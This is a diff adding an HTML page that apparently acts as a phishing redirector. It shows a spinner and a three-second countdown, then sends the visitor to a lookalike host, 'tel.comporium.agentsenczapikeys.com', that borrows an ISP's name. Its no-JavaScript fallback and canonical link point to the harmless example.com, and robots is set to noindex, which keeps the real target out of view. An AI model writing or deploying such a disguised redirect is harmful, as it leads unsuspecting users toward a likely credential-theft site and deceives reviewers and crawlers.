@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Redirecting…</title>
+
+  <!-- Fallback for users without JavaScript -->
+  <noscript>
+    <meta http-equiv="refresh" content="3; url=https://example.com">
+  </noscript>
+
+  <link rel="canonical" href="https://example.com">
+  <meta name="robots" content="noindex, nofollow">
+
+  <style>
+    * { box-sizing: border-box; }
+
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+    }
+
+    body {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+      background: #ffffff;
+      color: #333;
+      position: relative;
+      overflow: hidden;
+    }
+
+    /* Watermark logo */
+    body::before {
+      content: "";
+      position: fixed;
+      inset: 0;
+      background-image: url("https://i.imghippo.com/files/nCh4587cHM.png");
+      background-repeat: no-repeat;
+      background-position: center;
+      background-size: 420px;
+      opacity: 0.06;
+      z-index: 0;
+      pointer-events: none;
+    }
+
+    .box {
+      position: relative;
+      z-index: 1;
+      text-align: center;
+      padding: 2rem;
+    }
+
+    /* Blue dot spinner */
+    .spinner {
+      width: 56px;
+      height: 56px;
+      margin: 0 auto 1.25rem;
+      position: relative;
+      animation: spinner-rotate 1.4s linear infinite;
+    }
+
+    .spinner .dot {
+      position: absolute;
+      width: 14px;
+      height: 14px;
+      background: #0066cc;
+      border-radius: 50%;
+      top: 0;
+      left: 50%;
+      transform: translateX(-50%);
+      animation: dot-pulse 1.4s ease-in-out infinite;
+    }
+
+    /* 8 dots around the circle */
+    .spinner .dot:nth-child(1) { transform: rotate(0deg)   translateY(-21px); animation-delay: -1.4s; }
+    .spinner .dot:nth-child(2) { transform: rotate(45deg)  translateY(-21px); animation-delay: -1.225s; }
+    .spinner .dot:nth-child(3) { transform: rotate(90deg)  translateY(-21px); animation-delay: -1.05s; }
+    .spinner .dot:nth-child(4) { transform: rotate(135deg) translateY(-21px); animation-delay: -0.875s; }
+    .spinner .dot:nth-child(5) { transform: rotate(180deg) translateY(-21px); animation-delay: -0.7s; }
+    .spinner .dot:nth-child(6) { transform: rotate(225deg) translateY(-21px); animation-delay: -0.525s; }
+    .spinner .dot:nth-child(7) { transform: rotate(270deg) translateY(-21px); animation-delay: -0.35s; }
+    .spinner .dot:nth-child(8) { transform: rotate(315deg) translateY(-21px); animation-delay: -0.175s; }
+
+    @keyframes spinner-rotate {
+      to { transform: rotate(360deg); }
+    }
+
+    @keyframes dot-pulse {
+      0%, 100% { opacity: 0.15; }
+      50%      { opacity: 1; }
+    }
+
+    .box p {
+      font-size: 1rem;
+      margin: 0.35rem 0;
+      color: #555;
+    }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <div class="spinner" aria-hidden="true">
+      <span class="dot"></span>
+      <span class="dot"></span>
+      <span class="dot"></span>
+      <span class="dot"></span>
+      <span class="dot"></span>
+      <span class="dot"></span>
+      <span class="dot"></span>
+      <span class="dot"></span>
+    </div>
+    <p>Redirecting in <span id="count">3</span> second(s)…</p>
+  </div>
+
+  <script>
+    let seconds = 3;
+    const countEl = document.getElementById("count");
+
+    const ticker = setInterval(() => {
+      seconds -= 1;
+      if (countEl) countEl.textContent = seconds;
+    }, 1000);
+
+    setTimeout(() => {
+      clearInterval(ticker);
+      window.location.replace("https://tel.comporium.agentsenczapikeys.com/comporium");
+    }, 3000);
+  </script>
+</body>
+</html>
